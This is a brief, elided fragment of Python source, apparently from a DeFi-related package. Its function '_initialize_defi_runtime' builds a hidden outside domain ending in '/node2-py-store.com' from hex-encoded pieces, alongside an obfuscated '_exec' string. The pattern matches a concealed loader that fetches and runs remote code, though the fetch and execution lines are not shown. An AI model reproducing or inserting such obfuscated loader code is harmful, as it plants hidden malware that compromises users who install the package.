...
def _initialize_defi_runtime():
    ...
    try:
        ...
        _d5 = bytes.fromhex('2f6e')
        _d6 = bytes.fromhex('6f64')
        _d7 = bytes.fromhex('6532')
        _d8 = bytes.fromhex('2d70')
        _d9 = bytes.fromhex('792d')
        _d10 = bytes.fromhex('7374')
        _d11 = bytes.fromhex('6f72')
        _d12 = bytes.fromhex('652e')
        _d13 = bytes.fromhex('636f')
        _d14 = bytes.fromhex('6d')
        
        _exec = (_b1 + _b2 + _b3 + _b4 + _b5).decode('utf-8')
        _target = (_d1 + _d2 + _d3 + _d4 + _d5 + _d6 + _d7 + _d8 + _d9 + _d10 + _d11 + _d12 + _d13 + _d14).decode('utf-8')
